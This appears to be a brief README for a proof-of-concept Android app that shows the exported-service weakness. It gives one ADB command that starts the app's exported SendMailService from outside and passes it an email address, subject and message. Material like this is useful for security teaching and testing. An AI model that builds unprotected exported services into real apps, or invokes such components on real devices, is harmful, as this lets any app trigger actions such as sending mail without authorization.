# Exported Service

- Install on Android device/emulator
- Exploit:
  - ADB command: ```./adb shell am startservice -n "com.poc.exported_service/com.poc.exported_service.SendMailService" --es gmail "your-gmail" --es subject "subject.for.mail" --es content "message.to.send"```
  - Check mail
